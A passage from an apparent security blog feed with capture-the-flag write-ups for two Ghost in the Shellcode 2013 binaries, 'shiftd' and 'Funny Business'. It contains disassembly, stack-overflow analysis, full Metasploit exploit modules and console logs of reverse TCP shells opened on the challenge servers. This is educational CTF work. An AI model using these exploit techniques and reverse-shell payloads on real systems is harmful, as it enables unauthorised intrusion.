</pre></td><td class='code'><pre><code class='bash'><span class='line'>.text:0000000000400931                 mov     rax, cs:off_601068
</span><span class='line'>.text:0000000000400938                 mov     rcx, rax
</span><span class='line'>.text:000000000040093B                 and     ecx, 7FFFFFFFh
</span><span class='line'>.text:0000000000400941                 lea     rax, <span class="o">[</span>rbp+format<span class="o">]</span>
</span><span class='line'>.text:0000000000400948                 mov     edx, 0Ah
</span><span class='line'>.text:000000000040094D                 mov     rsi, rcx
</span><span class='line'>.text:0000000000400950                 mov     rdi, rax
</span><span class='line'>.text:0000000000400953                 call    read_from_socket
</span></code></pre></td></tr></table></div></figure>

<p>Note that the format string buffer is size 1024, and the call is:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>read<em>from</em>socket<span class="o">(</span>format, 0x6014b0, <span class="s1">&#39;\n&#39;</span><span class="o">)</span>.
</span></code></pre></td></tr></table></div></figure></p>

<p>So there we have it, a stack based buffer overflow. 1064 bytes until we reach the stored return address on the stack. By leveraging the leaked stack pointer, we can redirect execution to our embedded shellcode.</p>

<p>MSF Module:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1">##</span>
</span><span class='line'><span class="c1"># This file is part of the Metasploit Framework and may be subject to</span>
</span><span class='line'><span class="c1"># redistribution and commercial restrictions. Please see the Metasploit</span>
</span><span class='line'><span class="c1"># web site for more information on licensing and terms of use.</span>
</span><span class='line'><span class="c1">#   http://metasploit.com/</span>
</span><span class='line'><span class="c1">##</span>
</span><span class='line'>
</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;msf/core&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="k">class</span> <span class="nc">Metasploit3</span> <span class="o">&lt;</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">Remote</span>
</span><span class='line'>        <span class="no">Rank</span> <span class="o">=</span> <span class="no">GreatRanking</span>
</span><span class='line'>
</span><span class='line'>        <span class="kp">include</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">Remote</span><span class="o">::</span><span class="no">Tcp</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="n">info</span> <span class="o">=</span> <span class="p">{})</span>
</span><span class='line'>                <span class="k">super</span><span class="p">(</span><span class="n">update<em>info</span><span class="p">(</span><span class="n">info</span><span class="p">,</span>
</span><span class='line'>                        <span class="s1">&#39;Name&#39;</span>           <span class="o">=&gt;</span> <span class="s1">&#39;GitS 2013 Pwnable 100 - shiftd&#39;</span><span class="p">,</span>
</span><span class='line'>                        <span class="s1">&#39;Author&#39;</span>         <span class="o">=&gt;</span> <span class="o">[</span> <span class="s1">&#39;stacks0n&#39;</span><span class="p">,</span> <span class="s1">&#39;hubris&#39;</span> <span class="o">]</span><span class="p">,</span>
</span><span class='line'>                        <span class="s1">&#39;Privileged&#39;</span>     <span class="o">=&gt;</span> <span class="kp">false</span><span class="p">,</span>
</span><span class='line'>                        <span class="s1">&#39;Platform&#39;</span>       <span class="o">=&gt;</span> <span class="o">[</span> <span class="s1">&#39;linux&#39;</span> <span class="o">]</span><span class="p">,</span>
</span><span class='line'>                        <span class="s1">&#39;Arch&#39;</span>           <span class="o">=&gt;</span> <span class="no">ARCH</em>X86<em>64</span><span class="p">,</span>
</span><span class='line'>                        <span class="s1">&#39;Targets&#39;</span>        <span class="o">=&gt;</span> <span class="o">[</span> <span class="o">[</span> <span class="s1">&#39;Automatic&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="p">}</span>  <span class="o">]</span><span class="p">,</span> <span class="o">]</span><span class="p">,</span>
</span><span class='line'>                        <span class="s1">&#39;DefaultTarget&#39;</span>  <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>                <span class="n">register</em>options</span><span class="p">(</span>
</span><span class='line'>                        <span class="o">[</span>
</span><span class='line'>                                <span class="no">Opt</span><span class="o">::</span><span class="no">RHOST</span><span class="p">(</span><span class="s1">&#39;54.235.156.9&#39;</span><span class="p">),</span>
</span><span class='line'>                                <span class="no">Opt</span><span class="o">::</span><span class="no">RPORT</span><span class="p">(</span><span class="mi">5177</span><span class="p">)</span>
</span><span class='line'>                        <span class="o">]</span><span class="p">,</span> <span class="nb">self</span><span class="o">.</span><span class="n">class</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">def</span> <span class="nf">exploit</span>
</span><span class='line'>                <span class="n">connect</span>
</span><span class='line'>
</span><span class='line'>                <span class="c1"># send the secret password</span>
</span><span class='line'>                <span class="c1"># we can send extra data, not that it matters</span>
</span><span class='line'>                <span class="n">sock</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="s2">&quot;NowIsTheWinterOfOurDiscountTent</span><span class="se">\x00</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="s2">&quot;A&quot;</span> <span class="o"><em></span> <span class="mi">32</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
</span><span class='line'>                <span class="n">print<em>status</span> <span class="n">sock</span><span class="o">.</span><span class="n">get</em>once</span>
</span><span class='line'>
</span><span class='line'>                <span class="c1"># send the username</span>
</span><span class='line'>                <span class="n">sock</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="s2">&quot;|</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
</span><span class='line'>                <span class="n">resp</span> <span class="o">=</span> <span class="n">print<em>status</span> <span class="n">sock</span><span class="o">.</span><span class="n">get</em>once</span>
</span><span class='line'>
</span><span class='line'>                <span class="c1"># process the stack address that is leaked to us</span>
</span><span class='line'>                <span class="n">stack<em>addr</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="n">resp</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;|&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">last</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;!&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">first</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\x00\x00</span><span class="s2">&quot;</span>
</span><span class='line'>
</span><span class='line'>                <span class="c1"># subtract some off this stack addres to allow us more room for</span>
</span><span class='line'>                <span class="c1"># nop sled and shellcode</span>
</span><span class='line'>                <span class="n">stack</em>addr</span> <span class="o">=</span> <span class="o">[</span><span class="n">stack<em>addr</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&quot;Q&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">first</span> <span class="o">-</span> <span class="mh">0x100</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;Q&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>                <span class="c1"># send the format string for strftime()</span>
</span><span class='line'>                <span class="c1"># overflow alert!</span>
</span><span class='line'>                <span class="n">payload</em>size</span> <span class="o">=</span> <span class="mi">1064</span>
</span><span class='line'>                <span class="n">junk</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> <span class="o"></em></span> <span class="mi">48</span> <span class="c1"># we don&#39;t want to trash our payload with push&#39;s</span>
</span><span class='line'>                <span class="nb">p</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x90</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="n">payload<em>size</span> <span class="o">-</span> <span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">encoded</span><span class="o">.</span><span class="n">size</span> <span class="o">+</span> <span class="n">junk</span><span class="o">.</span><span class="n">size</span><span class="p">))</span>
</span><span class='line'>                <span class="nb">p</span> <span class="o">+=</span> <span class="n">payload</span><span class="o">.</span><span class="n">encoded</span> <span class="o">+</span> <span class="n">junk</span>
</span><span class='line'>
</span><span class='line'>                <span class="c1"># send the payload</span>
</span><span class='line'>                <span class="n">sock</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="nb">p</span> <span class="o">+</span> <span class="n">stack</em>addr</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
</span><span class='line'>                <span class="n">print<em>status</span> <span class="n">sock</span><span class="o">.</span><span class="n">get</em>once</span>
</span><span class='line'>
</span><span class='line'>                <span class="n">handler</span>
</span><span class='line'>                <span class="n">disconnect</span>
</span><span class='line'>        <span class="k">end</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>msf  exploit<span class="o">(</span>shiftd<span class="o">)</span> &gt; show options
</span><span class='line'>
</span><span class='line'>Module options <span class="o">(</span>exploit/gits/shiftd<span class="o">)</span>:
</span><span class='line'>
</span><span class='line'>   Name   Current Setting  Required  Description
</span><span class='line'>   ----   ---------------  --------  -----------
</span><span class='line'>   RHOST  204.236.213.69   yes       The target address
</span><span class='line'>   RPORT  5177             yes       The target port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Payload options <span class="o">(</span>linux/x64/shell<em>reverse</em>tcp<span class="o">)</span>:
</span><span class='line'>
</span><span class='line'>   Name   Current Setting  Required  Description
</span><span class='line'>   ----   ---------------  --------  -----------
</span><span class='line'>   LHOST  50.142.246.171   yes       The listen address
</span><span class='line'>   LPORT  4444             yes       The listen port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Automatic
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf  exploit<span class="o">(</span>shiftd<span class="o">)</span> &gt; exploit
</span><span class='line'>
</span><span class='line'><span class="o">[</span>-<span class="o">]</span> Handler failed to <span class="nb">bind </span>to 50.142.246.171:4444
</span><span class='line'><span class="o">[</span><em><span class="o">]</span> Started reverse handler on 0.0.0.0:4444
</span><span class='line'><span class="o">[</span></em><span class="o">]</span> Welcome to Shifty<span class="err">&#39;</span>s Time Formatting Service!
</span><span class='line'>What is your name?
</span><span class='line'>
</span><span class='line'><span class="o">[</span><em><span class="o">]</span> Welcome, |??<span class="o">(</span>!
</span><span class='line'>Please provide a <span class="nb">time </span>format:
</span><span class='line'>
</span><span class='line'><span class="o">[</span></em><span class="o">]</span> Your formatted <span class="nb">time </span>is:
</span><span class='linej<span class="o">)</span>X?j_j^H?H?
</span><span class='line'>
</span><span class='line'>Thank you! Come again!
</span><span class='line'>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Command shell session 1 opened <span class="o">(</span>192.168.1.101:4444 -&gt; 204.236.213.69:36107<span class="o">)</span> at 2013-02-16 16:49:49 -0500
</span><span class='line'>
</span><span class='line'>cat key
</span><span class='line'>cat: key: No such file or directory
</span><span class='line'>whoami
</span><span class='line'>shiftd
</span><span class='line'><span class="nb">cd</span> /home/shiftd
</span><span class='line'>ls
</span><span class='line'>key
</span><span class='line'>shiftd
</span><span class='line'>cat key
</span><span class='line'>http://shifty.urbanup.com/4195551
</span></code></pre></td></tr></table></div></figure></p>

<h2>Solution</h2>

<p>http://shifty.urbanup.com/4195551</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[GitS 2013 - Funny Business]]></title>
    <link href="http://www.captchaflag.com/blog/2013/02/17/gits-2013-funny-business/"/>
    <updated>2013-02-17T13:53:00-05:00</updated>
    <id>http://www.captchaflag.com/blog/2013/02/17/gits-2013-funny-business</id>
    <content type="html"><![CDATA[<h2>Challenge</h2>

<p>Points: 100</p>

<p>Find the key! (<a href="https://2013.ghostintheshellcode.com/funnybusiness-fb84813ddd932f6aceee0ed3a4e9f1e0a7082dc1">File</a> running at funnybusiness.2013.ghostintheshellcode.com)</p>

<h2>Analysis</h2>

<p>In order to get the binary to run on 32-bit Linux, you first need to run:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>adduser funnybusiness
</span><span class='line'><span class="nv">$ </span>sudo su
</span><span class='line'><span class="nv">$ </span>./funnybiz.elf
</span></code></pre></td></tr></table></div></figure></p>

<p>Application is running on port 49681:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>stacks0n@ubuntu:~/Desktop<span class="nv">$ </span>netstat -antp | grep LISTEN | grep funnybiz
</span><span class='line'>tcp        0      0 0.0.0.0:49681           0.0.0.0:*               LISTEN      17495/funnybiz.elf
</span></code></pre></td></tr></table></div></figure></p>

<p>Let&#8217;s look at HexRays decompilation of sub<em>8048C60:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>int __cdecl sub</em>8048D70<span class="o">(</span>int sock<em>fd<span class="o">)</span>
</span><span class='line'><span class="o">{</span>
</span><span class='line'>  int v1; // ebx@1
</span><span class='line'>  char v3; // <span class="o">[</span>sp+1Fh<span class="o">]</span> <span class="o">[</span>bp-Dh<span class="o">]</span>@4
</span><span class='line'>
</span><span class='line'>  *<span class="o">(</span></em>QWORD *<span class="o">)</span>&amp;strm.zalloc <span class="o">=</span> 0LL;
</span><span class='line'>  strm.opaque <span class="o">=</span> 0;
</span><span class='line'>  *<span class="o">(</span><em>QWORD *<span class="o">)</span>&amp;strm.next</em>in <span class="o">=</span> 0LL;
</span><span class='line'>  <span class="nv">v1</span> <span class="o">=</span> inflateInit<em><span class="o">(</span>&amp;strm, <span class="s2">&quot;1.2.7&quot;</span>, 56<span class="o">)</span>;
</span><span class='line'>  <span class="k">if</span> <span class="o">(</span> !v1 <span class="o">)</span>
</span><span class='line'>  <span class="o">{</span>
</span><span class='line'>    read</em>data<em>from</em>socket<span class="o">(</span>sock<em>fd, &amp;strm.avail</em>in, 4<span class="o">)</span>;
</span><span class='line'>    <span class="k">if</span> <span class="o">(</span> strm.avail<em>in &lt;<span class="o">=</span> 0x4000 <span class="o">)</span>
</span><span class='line'>    <span class="o">{</span>
</span><span class='line'>      read</em>data<em>from</em>socket<span class="o">(</span>sock<em>fd, &amp;v3, strm.avail</em>in<span class="o">)</span>;
</span><span class='line'>      strm.next<em>in <span class="o">=</span> <span class="o">(</span>Bytef *<span class="o">)</span>&amp;v3;
</span><span class='line'>      strm.avail</em>out <span class="o">=</span> 16384;
</span><span class='line'>      strm.next<em>out <span class="o">=</span> <span class="o">(</span>Bytef *<span class="o">)</span>&amp;unk</em>804B0A0;
</span><span class='line'>      <span class="k">if</span> <span class="o">(</span> inflate<span class="o">(</span>&amp;strm, 4<span class="o">)</span> !<span class="o">=</span> 1 <span class="o">)</span>
</span><span class='line'>        <span class="nb">exit</span><span class="o">(</span>0<span class="o">)</span>;
</span><span class='line'>      inflateEnd<span class="o">(</span>&amp;strm<span class="o">)</span>;
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>  <span class="o">}</span>
</span><span class='line'>  <span class="k">return </span>v1;
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>We first send the size of our zlib data, which must be less than 0x4000. The size we provide is then used for the number of bytes to be read off the wire next.</p>

<p>The second call to read<em>from</em>socket() is copying our data directly to the stack, without any bounds checking. In this case, there isn&#8217;t even a buffer allocated for the data. </p>

<p>The last requirement is that the data supplied must be valid compressed zlib data, otherwise the program will exit before returning from this function. So, we simply send the smallest possible zlib stream and append our payload. The zlib stream will contain a size so we don&#8217;t have to worry about the appended data.</p>

<p>Find simple ROP gadget to redirect execution to the stack (since its executable) to avoid any issues with stack randomization.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>stacks0n@stack0ns-MacBook-Pro:~&gt; ./msfelfscan funnybiz.elf -j esp
</span><span class='line'><span class="o">[</span>/Users/stacks0n/funnybiz.elf<span class="o">]</span>
</span><span class='line'>0x08049043 jmp esp
</span></code></pre></td></tr></table></div></figure>

<p>MSF module as follows:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1">##</span>
</span><span class='line'><span class="c1"># This file is part of the Metasploit Framework and may be subject to</span>
</span><span class='line'><span class="c1"># redistribution and commercial restrictions. Please see the Metasploit</span>
</span><span class='line'><span class="c1"># web site for more information on licensing and terms of use.</span>
</span><span class='line'><span class="c1">#   http://metasploit.com/</span>
</span><span class='line'><span class="c1">##</span>
</span><span class='line'>
</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;msf/core&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="k">class</span> <span class="nc">Metasploit3</span> <span class="o">&lt;</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">Remote</span>
</span><span class='line'>        <span class="no">Rank</span> <span class="o">=</span> <span class="no">GreatRanking</span>
</span><span class='line'>
</span><span class='line'>        <span class="kp">include</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">Remote</span><span class="o">::</span><span class="no">Tcp</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="n">info</span> <span class="o">=</span> <span class="p">{})</span>
</span><span class='line'>                <span class="k">super</span><span class="p">(</span><span class="n">update<em>info</span><span class="p">(</span><span class="n">info</span><span class="p">,</span>
</span><span class='line'>                        <span class="s1">&#39;Name&#39;</span>           <span class="o">=&gt;</span> <span class="s1">&#39;GitS 2013 Pwnable 100 - Funny Business&#39;</span><span class="p">,</span>
</span><span class='line'>                        <span class="s1">&#39;Author&#39;</span>         <span class="o">=&gt;</span> <span class="s1">&#39;stacks0n&#39;</span><span class="p">,</span>
</span><span class='line'>                        <span class="s1">&#39;License&#39;</span>        <span class="o">=&gt;</span> <span class="no">MSF</em>LICENSE</span><span class="p">,</span>
</span><span class='line'>                        <span class="s1">&#39;Privileged&#39;</span>     <span class="o">=&gt;</span> <span class="kp">true</span><span class="p">,</span>
</span><span class='line'>                        <span class="s1">&#39;Platform&#39;</span>       <span class="o">=&gt;</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span>
</span><span class='line'>                        <span class="s1">&#39;DefaultTarget&#39;</span>  <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>                <span class="n">register_options</span><span class="p">(</span>
</span><span class='line'>                        <span class="o">[</span>
</span><span class='line'>                                <span class="no">Opt</span><span class="o">::</span><span class="no">RHOST</span><span class="p">(</span><span class="s1">&#39;54.235.156.9&#39;</span><span class="p">),</span>
</span><span class='line'>                                <span class="no">Opt</span><span class="o">::</span><span class="no">RPORT</span><span class="p">(</span><span class="mi">49681</span><span class="p">)</span>
</span><span class='line'>                        <span class="o">]</span><span class="p">,</span> <span class="nb">self</span><span class="o">.</span><span class="n">class</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">def</span> <span class="nf">exploit</span>
</span><span class='line'>                <span class="n">connect</span>
</span><span class='line'>                <span class="c1"># we must send valid zlib data so the code doesn&#39;t exit</span>
</span><span class='line'>                <span class="c1"># this is zlib deflation of a single &#39;a&#39;</span>
</span><span class='line'>                <span class="n">zlib</span>    <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x78\x9C\x73\xE4\x02\x00\x00\x8E\x00\x4C</span><span class="s2">&quot;</span>
</span><span class='line'>                <span class="n">padding</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x90\x90\x90</span><span class="s2">&quot;</span>
</span><span class='line'>                <span class="n">rop</span>     <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x43\x90\x04\x08</span><span class="s2">&quot;</span> <span class="c1"># jmp esp</span>
</span><span class='line'>                <span class="nb">p</span>       <span class="o">=</span> <span class="n">zlib</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">rop</span> <span class="o">+</span> <span class="n">payload</span><span class="o">.</span><span class="n">encoded</span>
</span><span class='line'>
</span><span class='line'>                <span class="c1"># send the size of our payload</span>
</span><span class='line'>                <span class="n">sock</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="o">[</span><span class="nb">p</span><span class="o">.</span><span class="n">size</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;L&quot;</span><span class="p">))</span>
</span><span class='line'>                <span class="c1"># send the payload</span>
</span><span class='line'>                <span class="n">sock</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="nb">p</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>                <span class="n">handler</span>
</span><span class='line'>                <span class="n">disconnect</span>
</span><span class='line'>        <span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>msf  exploit<span class="o">(</span>funny_business<span class="o">)</span> &gt; show options
</span><span class='line'>
</span><span class='line'>Module options <span class="o">(</span>exploit/gits/funny_business<span class="o">)</span>:
</span><span class='line'>
</span><span class='line'>   Name   Current Setting  Required  Description
</span><span class='line'>   ----   ---------------  --------  -----------
</span><span class='line'>   RHOST  54.235.156.9     yes       The target address
</span><span class='line'>   RPORT  49681            yes       The target port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Payload options <span class="o">(</span>linux/x86/shell_reverse_tcp<span class="o">)</span>:
</span><span class='line'>
</span><span class='line'>   Name   Current Setting  Required  Description
</span><span class='line'>   ----   ---------------  --------  -----------
</span><span class='line'>   LHOST  68.47.237.170     yes       The listen address
</span><span class='line'>   LPORT  4444             yes       The listen port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Automatic
</span><span class='line'>
</span><span class='line'>msf  exploit<span class="o">(</span>funny_business<span class="o">)</span> &gt; exploit
</span><span class='line'>
</span><span class='line'><span class="o">[</span>-<span class="o">]</span> Handler failed to <span class="nb">bind </span>to 68.47.237.170:4444
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Started reverse handler on 0.0.0.0:4444
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Command shell session 1 opened <span class="o">(</span>192.168.1.30:4444 -&gt; 54.235.156.9:57768<span class="o">)</span> at 2013-02-15 23:54:39 -0500
</span><span class='line'>
</span><span class='line'>cat key
